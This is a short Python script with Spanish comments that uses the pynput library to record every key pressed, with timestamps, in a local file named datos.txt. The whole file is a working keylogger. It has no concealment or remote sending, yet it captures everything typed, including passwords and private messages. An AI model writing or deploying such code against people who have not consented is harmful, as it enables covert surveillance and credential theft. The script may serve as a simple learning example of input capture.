# -*- coding: utf-8 -*-
"""
Created on Thu Oct 13 12:57:19 2022

@author: chelo
"""

from pynput.keyboard import Listener
import logging

def analizaBotonPresionado(tecla):
    #cada vez que se preciona una tecla se almacena
    logging.info(str(tecla))
        
logging.basicConfig(
    filename = ("datos.txt"),
    level = logging.DEBUG,
    format = "%(asctime)s-%(message)s"
)

with Listener(on_press=analizaBotonPresionado) as listener:
    listener.join()